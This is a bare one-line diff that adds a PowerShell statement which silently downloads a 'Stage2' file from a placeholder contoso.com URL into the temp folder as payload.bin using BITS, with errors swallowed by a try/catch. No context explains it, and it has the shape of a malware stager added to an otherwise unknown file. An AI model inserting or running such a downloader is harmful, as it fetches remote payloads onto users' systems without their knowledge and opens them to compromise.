@@ -1,0 +1,1 @@
+try { $Stage2Url = "https://contoso.com/update.dat"; $LocalPath = "$env:TEMP\payload.bin"; Start-BitsTransfer -Source $Stage2Url -Destination $LocalPath; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8" } catch { Write-Warning "Remote fetch failed" }
